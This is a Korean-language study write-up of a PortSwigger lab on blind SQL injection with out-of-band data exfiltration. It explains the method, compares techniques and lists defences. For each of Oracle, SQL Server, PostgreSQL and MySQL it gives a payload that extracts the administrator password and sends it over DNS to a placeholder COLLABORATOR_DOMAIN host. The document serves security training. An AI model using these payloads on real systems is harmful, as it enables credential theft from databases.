# Lab: Blind SQL injection with out-of-band data exfiltration

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — Blind / Out-of-band Data Exfiltration
- **링크**: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet
- **상태**: Burp Collaborator 미사용 플랜으로 실습 완료 불가 — 016에 이어 개념 학습으로 대체

## 목표

DNS 요청의 서브도메인에 실제 데이터(비밀번호)를 포함시켜 Burp Collaborator로 전송함으로써 `administrator` 비밀번호를 추출한다.

## 016 랩과의 차이

016은 DNS 요청 발생 자체로 취약점 **존재 여부만 확인**했다. 이 랩은 DNS 요청에 **실제 데이터를 담아** 외부로 빼내는 단계로 확장된다.

| 항목 | 016 | 017 |
|------|-----|-----|
| 목표 | DNS 요청 발생 확인 | DNS 요청에 데이터 포함하여 추출 |
| Collaborator 수신 내용 | 요청 발생 여부 | 서브도메인에 포함된 실제 데이터 |
| 페이로드 | `http://COLLABORATOR/` | `http://[password].COLLABORATOR/` |

## 동작 원리

```
비밀번호 쿼리 결과를 DNS 서브도메인에 삽입
              ↓
DB 서버가 '[password].COLLABORATOR_DOMAIN' 으로 DNS 조회
              ↓
Burp Collaborator가 수신한 DNS 요청의 서브도메인에서 비밀번호 확인
```

이진 탐색 없이 **한 번의 DNS 요청**으로 전체 비밀번호가 전달된다.

## DBMS별 데이터 추출 페이로드

[PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)의 DNS Lookup with data exfiltration 항목 기준.

### Oracle

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM
"http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR_DOMAIN/">
%remote;]>'),'/l') FROM DUAL--
```

### Microsoft SQL Server

```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.COLLABORATOR_DOMAIN/a"')--
```

### PostgreSQL

```sql
'; copy (SELECT password FROM users WHERE username='administrator')
to program 'nslookup '||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR_DOMAIN'--
```

### MySQL (Windows)

```sql
' LOAD FILE('\\\\'+( SELECT password FROM users WHERE username='administrator')+'.COLLABORATOR_DOMAIN\\a')--
```

## 핵심 정리

- DNS 서브도메인에 쿼리 결과를 문자열 연결(`||`, `+`)로 삽입하면 데이터가 네트워크 요청에 실려 외부로 전송된다.
- 이진 탐색 불필요 — 한 번의 요청으로 전체 값을 추출할 수 있어 Visible Error-based(013)와 유사한 효율을 낸다.
- 016의 모든 제약 조건(DB 아웃바운드 허용, Collaborator 필요, DBMS별 권한)이 동일하게 적용된다.
- **방어**: DB 서버 아웃바운드 네트워크 차단, Prepared Statement 사용, DB 계정 권한 최소화.

## 배운 점 및 추가 학습

### 1. 데이터 추출 효율 비교

| 방법 | 랩 | 요청 수 (20자 비밀번호 기준) |
|------|-----|---------------------------|
| UNION 직접 출력 | 003~010 | 1회 |
| Visible Error-based | 013 | 1~2회 |
| **Out-of-band Exfiltration** | **017** | **1회** |
| Conditional Responses/Errors | 011·012 | ~140회 |
| Time-based | 015 | ~140회 + 대기 시간 |

Out-of-band는 HTTP 응답에 아무 정보도 없는 환경에서도 데이터를 단 한 번의 요청으로 추출할 수 있는 강력한 방법이다.

### 2. DNS 서브도메인 길이 제한 주의

DNS 서브도메인은 최대 63자, 전체 도메인은 최대 253자 제한이 있다. 비밀번호가 길거나 다량의 데이터를 추출할 때는 나눠서 전송해야 한다.

```sql
-- 앞 20자만 추출
SUBSTRING(password, 1, 20)||'.COLLABORATOR_DOMAIN'
```

### 3. 016·017 실습 대안 — interactsh 활용

Burp Collaborator 없이 유사한 환경을 구성하려면 오픈소스 도구 [interactsh](https://github.com/projectdiscovery/interactsh)를 사용할 수 있다.

```bash
# interactsh 클라이언트 실행 → 고유 도메인 발급
interactsh-client

# 발급된 도메인을 페이로드에 사용
# 예: abc123.oast.live
```

DNS·HTTP 요청을 수신하면 터미널에 출력되므로 Collaborator와 유사하게 활용할 수 있다.

### 4. SQLi 전체 기법 마무리 정리

016·017로 SQLi의 전체 공격 스펙트럼 학습이 완료됐다.

```
[데이터가 보임]
  UNION 기반          → 응답에 직접 출력 (003~010)
  Visible Error-based → 에러 메시지에 노출 (013)

[데이터가 안 보임 — Blind]
  Conditional Responses → 응답 내용 차이 (011)
  Conditional Errors    → HTTP 상태 코드 차이 (012)
  Time-based            → 응답 시간 차이 (014·015)
  Out-of-band           → 외부 네트워크로 데이터 전송 (016·017)
```
